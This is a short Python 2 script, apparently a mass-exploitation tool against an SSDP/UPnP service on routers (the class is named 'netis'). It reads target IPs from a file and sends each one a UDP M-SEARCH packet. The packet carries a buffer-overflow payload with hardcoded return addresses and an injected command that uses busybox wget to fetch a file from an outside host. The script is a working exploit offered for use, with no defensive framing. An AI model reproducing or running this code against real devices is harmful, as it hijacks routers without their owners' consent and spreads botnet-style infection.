#! python !#
import threading, sys, time, random, socket, re, os, struct, array, requests
buffer = "\"" + "A"*140 + "\x8c\xdd\x0a\x40" + "A"*139 + "\x78\xfe\xff\xff" + "A"*16 + "\xf8\xda\x09\x40" + "A"*8 + "\xac\xb0\x0d\x40\x68\x55\x0a\x40" + "A"*108 + "sleep 1;busybox wget https://i.imger.me/8c393eaa9.gif;exit;#" + "A"*1307 + "\""
ips = open(sys.argv[1], "r").readlines()
commandpayload = "M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nST:uuid:schemas:device:" + buffer + ":end\r\nMan:\"ssdp:discover\"\r\nMX:3\r\n\r\n"

class netis(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
				print "Attempting %s"%(self.ip)
				s.sendto(commandpayload, (self.ip, 1900))
				time.sleep(1)
			except Exception:
				pass

for ip in ips:
	try:
		n = netis(ip)
		n.start()
		time.sleep(0.01)
	except:
		pass